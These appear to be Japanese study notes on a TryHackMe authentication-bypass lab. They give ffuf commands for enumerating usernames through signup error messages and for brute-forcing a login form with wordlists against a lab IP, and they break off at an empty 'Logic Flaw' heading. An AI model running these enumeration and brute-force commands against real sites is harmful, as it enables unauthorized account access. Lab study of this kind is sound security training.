# AuthenticationBypass

'https://tryhackme.com/room/authenticationbypass'

## Task2 Username Enumeration

websiteのエラーメッセージはusernameのリストを作成するのに重要な情報となる。

```bash
ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.50.41/customers/signup -mr "username already exists"
```

-w : wordlist利用  
-X: request method指定(defaultはGET)  
-d: 送るデータを特定するオプション  
※変数の名前はhtmlのinspectionで確認できる  
-H: adding additional Header to the request  
→これも開発者モードのnetworkからリクエストヘッダーを確認すること  
-u: specific the URL we are making the request to  
-mr: text on the page we are looking for to validate  


- ffufのダウンロード
'https://github.com/ffuf/ffuf'

補足：  
progressの表示が出てめっちゃ出力結果見づらいけど、テキストに標準出力してあげると結果だけ見えて見やすい！！

```bash
ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.50.41/customers/signup -mr "username already exists"　> valid_username.txt

cat valid_username.txt
```


## Task3 Brute Force

task2で特定したusernameを利用してBrute force 攻撃を仕掛ける。  

```bash
user@tryhackme$ ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.50.41/customers/login -fc 200
```

w1 :usernameのリストを指定
w2 :passwordのリストを指定
-fc :HTTP status が 200以外のものをフィルターする。

※valid_username.txtは、名前だけのリストに加工しないといけないので注意

## Task4 Logic Flaw

